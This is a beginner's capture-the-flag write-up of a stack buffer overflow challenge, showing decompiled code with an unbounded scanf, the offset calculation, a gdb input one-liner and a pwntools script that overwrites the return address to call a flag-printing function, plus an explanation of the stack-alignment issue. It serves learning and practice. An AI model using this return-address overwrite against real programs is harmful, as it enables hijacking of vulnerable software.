## Skills required: Beginner pwn skills, but with a hard twist

I used [gdb](https://manpages.org/gdb) and [IDA](https://hex-rays.com/ida-free/) during the CTF. I solved it by making a desperate move - bruteforcing.

## Solution:

I used IDA for static analysis. With IDA's *generate pseudocode* functionality, I could trace into the `check_fo2` function (which normally returns to `0x0040142c`):

```c
__int64 __fastcall check_fo2(int a1)
{
  char v2[112]; // [rsp+10h] [rbp-70h] BYREF

  if ( a1 )
  {
    if ( a1 < 0 )
    {
      puts("Negative number not possible. Please input your email for us to reach out to you:");
      __isoc99_scanf("%s", v2);
    }
  }
  else
  {
    puts("WARNING: Diving without oxygen in mixture will lead to death!");
    printf("A minimum Oxygen percentage of 21%% is advised\n");
  }
  return abs32(a1);
}
```

There's also `print_flag` at `0x00401343`:
```
int print_flag()
{
  char v1[104]; // [rsp+0h] [rbp-70h] BYREF
  FILE *v2; // [rsp+68h] [rbp-8h]

  v2 = fopen("./flag.txt", "r");
  if ( !v2 )
    return puts("file does not exist");
  __isoc99_fscanf(v2, "%99s", v1);
  return printf("%s", v1);
}
```

This seemed like a basic return address rewrite, so I used gdb to inspect the stack (I'll be using pwndbg for my first time for this writeup):

![image](https://user-images.githubusercontent.com/114584910/195996854-6953ba5b-6d9d-47eb-82d4-c7d4e61fd5e6.png)

The ... is messed up, but we can see the return address at `...dd38`, which means I'll need 16\*7+8 = 120 characters before the new return address.

I used the following gdb command to supply non-typeable ASCII characters: `run <<< $(python3 -c 'print("-1\n"+"A"*120+"\x43\x13\x40\x00")')` (I still have to [look it up](https://reverseengineering.stackexchange.com/questions/18295/basic-question-how-to-input-non-printable-hex-values-in-gdb-nc))

![image](https://user-images.githubusercontent.com/114584910/195998067-bacc638b-8cb5-4505-9b9d-fdbbdc0ed046.png)

pwndbg shows the new return address! I'm seeing why people are saying it's a cool add-on to gdb (besides the beautiful hexdump). Let's continue.

![image](https://user-images.githubusercontent.com/114584910/195998268-fac33d16-878f-4136-898d-308a94e193d1.png)

Uh-oh, a SIGSEGV, Segmentation fault occurred saying `vfscanf-internal.c: No such file or directory.`.

Sadly, search engines didn't turn up anything relevant to this case.
Worrying it's a technical issue, a couple of contestants consulted the organizers and they double checked the exploit is still working on the server.

I tried it on the server using this Python script with [pwntools](https://docs.pwntools.com/en/stable/), which is my first time:

```py
from pwn import *

conn = remote('chall.rumble.host',5415)
conn.sendlineafter(b'Oxygen in mix: ', b'-1')
conn.recvuntil(b'you:', drop=True)
conn.sendline(b"A"*112+b"B"*8+p32(0x00401343))
conn.interactive()
```

It, too, returned Segmentation fault. I was stumped on this for quite some time, then out of pure desperation, I tried a few nearby addresses and eventually `0x00401348` worked. I didn't understand why but a flag is a flag :P

### Post-event

I was surprised by the +5 offset required by the challenge - it isn't even a multiple of 4! (*totally newbie opinion*)

After the event, it was revealed to us that the stack was not properly aligned and it can be solved with a `ret` gadget.

*Wait what?*

You can execute a ret and then the print_flag. By this way, the stack has the needed alignment and no segfault occurs

I wasn't the only one who didn't understand my own exploit - and I got a sublime explanation:

- 0x00401348 skips the first `push RBP`, ignoring stack misalignments
- libc at times needs 16-bit stack alignment

Here are some pages that could be useful for learning, but I strongly feel that I am not at that level, in particular I have no knowledge or experience for ROP and a general poor understanding of assembly:
- [Stack overflow page 1](https://stackoverflow.com/questions/672461/what-is-stack-alignment)
- [Stack overflow page 2](https://stackoverflow.com/questions/4175281/what-does-it-mean-to-align-the-stack)
- [Basic ROP techniques](https://trustfoundry.net/2019/07/18/basic-rop-techniques-and-tricks/)

P.S. Upon checking other messages:

- "always happens when you overwrite the return address to jump to a function that relies on stack alignment"
- "libc uses movaps liberally which unfortunately requires an aligned stack"

Damn how I wish I knew to read the post-event messages for the last year during the CTF.
